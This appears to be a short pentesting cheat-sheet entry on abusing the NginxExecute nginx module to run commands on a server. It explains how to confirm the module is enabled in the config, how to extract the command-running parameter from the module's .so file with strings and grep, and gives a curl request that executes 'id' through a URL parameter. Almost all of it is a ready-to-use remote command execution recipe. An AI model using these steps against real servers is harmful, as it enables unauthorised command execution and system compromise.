## Github repo: https://github.com/limithit/NginxExecute

### Requirements: In the nginx configuration file, find (Command: on)

### strings /usr/share/nginx/modules/NAME_OF_THE_MODULE.so | grep run (Find the variable that runs commands on the server)

### Usage: curl -s -g "http://localhost:8000/?system.run[id]"

